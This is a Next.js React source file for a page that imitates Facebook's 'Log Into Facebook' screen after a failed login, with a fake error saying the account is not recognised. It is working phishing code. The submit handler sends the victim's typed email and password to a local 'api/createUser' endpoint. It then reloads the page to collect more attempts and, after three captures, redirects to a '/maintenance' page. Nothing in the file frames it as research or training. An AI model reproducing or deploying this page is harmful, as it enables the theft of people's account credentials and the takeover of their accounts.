"use client";
import React, { useState, useRef, useEffect } from "react";
import Link from "next/link";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { useForm } from "react-hook-form";

// Import images
import Logo from "@/public/logo.svg";
import eyeIcon from "@/public/show.png";
import hideIcon from "@/public/hide.png";
import warning from "@/public/warning.png";

export default function LoginFailedPage() {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const [email, setEmail] = useState();
  const [password, setPassword] = useState();
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const successCountRef = useRef(0);
  const emailRef = useRef(null);

  const router = useRouter();

  useEffect(() => {
    // Retrieve success count from localStorage on component mount
    successCountRef.current =
      parseInt(localStorage.getItem("successCount") || "0") || 0;
  }, []);

  useEffect(() => {
    // Save success count to localStorage whenever it changes
    localStorage.setItem("successCount", successCountRef.current.toString());
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [successCountRef.current]);

  useEffect(() => {
    const interval = setInterval(() => {
      if (successCountRef.current !== 0) {
        localStorage.setItem(
          "successCount",
          (successCountRef.current = 0).toString(),
        );
      }
    }, 60000);

    return () => clearInterval(interval); // Clear the interval on component unmount
  }, [successCountRef]);

  const onSubmit = async () => {
    // Set loading state
    setIsLoading(true);

    if (!email || !password || isLoading) {
      return setTimeout(() => {
        setIsLoading(false);
        if (successCountRef.current !== 3) {
          window.location.reload();
        }
      }, 3000);
    }

    try {
      // Sending a POST request to create a new user
      const res = await fetch("api/createUser", {
        method: "POST",
        headers: {
          "Content-type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      if (res.ok) {
        successCountRef.current += 1;
        // After successful submission, reload the document after 3 seconds
        setTimeout(() => {
          setEmail("");
          setPassword("");
          if (successCountRef.current >= 3) {
            // Redirect to maintenance page
            router.push("/maintenance");
          } else {
            console.log("reload");
            window.location.reload();
          }
        }, 3000);
      } else {
        throw new Error("Failed to create a user");
      }
    } catch (error) {
      console.log(error);
      // Reset loading state on error
      setIsLoading(false);
    }
  };

  // Effect hook to focus on the email input field when the component mounts
  useEffect(() => emailRef.current.focus(), []);

  return (
    <>
      <div className="bg-[#f0f2f5] pb-[5rem]">
        <div className="flex justify-center pt-9">
          <Image
            className="h-[5rem] w-full"
            src={Logo}
            alt="Facebook"
            priority
          />
        </div>
        <div className="flex justify-center">
          <form
            className="w-[25rem] rounded-lg border-2 bg-white p-4 pb-6 shadow-lg"
            onSubmit={handleSubmit(onSubmit)}
          >
            <p className="pb-4 text-center text-[1.2rem]">Log Into Facebook</p>
            <label
              htmlFor="username"
              className="text-sm font-medium text-gray-600"
            ></label>

            {/* Input field for email */}
            <div className="relative flex items-center justify-end">
              <input
                {...register("email")}
                type="text"
                id="email"
                className="mt-1 w-full rounded-md border-[1px] border-red-500 p-[0.85rem] pl-[1rem] text-[1.1rem] placeholder:text-[1.1rem] placeholder:tracking-wide focus:outline-0"
                placeholder="Email or phone number"
                ref={emailRef}
                autoComplete="on"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <div className="absolute mr-[0.6rem] mt-1 cursor-pointer">
                <Image
                  src={warning}
                  alt="Warning"
                  className="h-[20px] w-full"
                />
              </div>
            </div>
            <div className="mt-2 text-left text-sm leading-4 text-red-500">
              The email or mobile number you entered isn&apos;t connected to an
              account.{" "}
              <strong className="cursor-pointer tracking-wider hover:underline">
                <Link href="/maintenance">Find your account and log in.</Link>
              </strong>
            </div>

            <label
              htmlFor="password"
              className="mt-2 block text-xs font-medium text-gray-600"
            ></label>

            {/* Input field for password with show/hide functionality */}
            <div className="relative flex items-center justify-end">
              <input
                {...register("password")}
                type={showPassword ? "text" : "password"}
                id="password"
                className="mt-1 w-full rounded-md border-2 p-[0.8rem] pl-[1rem] text-[1.1rem] placeholder:text-[1.1rem] placeholder:tracking-wide focus:outline-offset-[-15px] focus:ring-2"
                placeholder="Password"
                onChange={(e) => setPassword(e.target.value)}
                value={password}
              />

              {password && (
                <div
                  className="absolute mr-4 mt-1 cursor-pointer"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  <Image
                    src={showPassword ? eyeIcon : hideIcon}
                    alt=""
                    className="h-[1.7rem] w-full rounded-full p-[0.35rem] hover:bg-gray-100 active:bg-gray-300"
                  />
                </div>
              )}
            </div>

            {/* Submit button for the login form */}
            <button
              type="submit"
              className={`mt-3 w-full rounded-md p-2 py-3 pt-2 font-sans text-xl font-bold ${
                isLoading
                  ? "cursor-not-allowed bg-[#0c4a6e] focus:ring-0"
                  : "bg-[#1877f2] hover:bg-[#166fe5]"
              } tracking-wide text-white transition-all focus:outline-0 focus:ring focus:ring-blue-300 focus:transition-all focus:duration-500 active:ring-0 active:transition-none`}
            >
              Log In
            </button>
            <Link
              href="/maintenance"
              className="mt-4 block pb-1 text-center text-[15px] text-blue-600 hover:underline"
            >
              Forgot password?
            </Link>
          </form>
        </div>
      </div>
    </>
  );
}
